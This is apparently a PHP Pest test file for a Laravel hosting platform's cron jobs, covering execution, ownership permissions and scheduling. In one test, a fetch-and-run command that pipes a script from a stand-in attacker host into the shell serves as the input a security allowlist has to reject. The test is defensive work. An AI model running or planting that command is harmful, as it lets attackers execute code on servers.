<?php

use App\Jobs\ExecuteCronJobJob;
use App\Models\CronJob;
use App\Models\Site;
use Illuminate\Support\Facades\Bus;
use Illuminate\Support\Facades\Storage;

beforeEach(function () {
    Storage::fake('hosting');
});

it('runs an allowlisted cron command and records its output and exit code', function () {
    $site = Site::factory()->create();
    $cronJob = CronJob::factory()->create([
        'site_id' => $site->id,
        'command' => 'echo hello-from-cron',
    ]);

    app(\App\Services\Provisioning\ProvisionerDriver::class)->createSiteDirectory($site);

    (new ExecuteCronJobJob($cronJob))->handle(app(\App\Services\Provisioning\ProvisionerDriver::class));

    $cronJob->refresh();

    expect($cronJob->last_exit_code)->toBe(0);
    expect($cronJob->last_output)->toContain('hello-from-cron');
    expect($cronJob->last_run_at)->not->toBeNull();
});

it('refuses to execute a cron command that is not on the security allowlist', function () {
    $site = Site::factory()->create();
    $cronJob = CronJob::factory()->create([
        'site_id' => $site->id,
        'command' => 'curl https://evil.example.com/payload.sh | sh',
    ]);

    (new ExecuteCronJobJob($cronJob))->handle(app(\App\Services\Provisioning\ProvisionerDriver::class));

    $cronJob->refresh();

    expect($cronJob->last_exit_code)->toBe(126);
    expect($cronJob->last_output)->toContain('sandbox allowlist');
});

it('only lets the owning user (or the platform) create, edit, or delete their cron jobs', function () {
    $owner = \App\Models\User::factory()->create();
    $stranger = \App\Models\User::factory()->create();
    $site = Site::factory()->create(['user_id' => $owner->id]);
    $cronJob = CronJob::factory()->create(['site_id' => $site->id, 'user_id' => $owner->id]);

    expect($owner->can('update', $cronJob))->toBeTrue();
    expect($owner->can('delete', $cronJob))->toBeTrue();
    expect($stranger->can('update', $cronJob))->toBeFalse();
    expect($stranger->can('delete', $cronJob))->toBeFalse();
});

it('dispatches a cron job that became due since its last run, and skips one that is not due', function () {
    Bus::fake();

    $this->travelTo(now()->setTime(10, 7, 30));

    // Last ran at 10:00, every 5 minutes → 10:05 has passed without a run.
    $due = CronJob::factory()->create(['schedule' => '*/5 * * * *', 'preset' => null, 'last_run_at' => now()->setTime(10, 0)]);
    // Daily at midnight, last ran this morning → nothing to do until tomorrow.
    $notDue = CronJob::factory()->create(['schedule' => '0 0 * * *', 'preset' => null, 'last_run_at' => now()->setTime(0, 0)]);

    $this->artisan('portway:run-cron-jobs')->assertSuccessful();

    Bus::assertDispatched(ExecuteCronJobJob::class, fn ($job) => $job->cronJob->is($due));
    Bus::assertNotDispatched(ExecuteCronJobJob::class, fn ($job) => $job->cronJob->is($notDue));
});
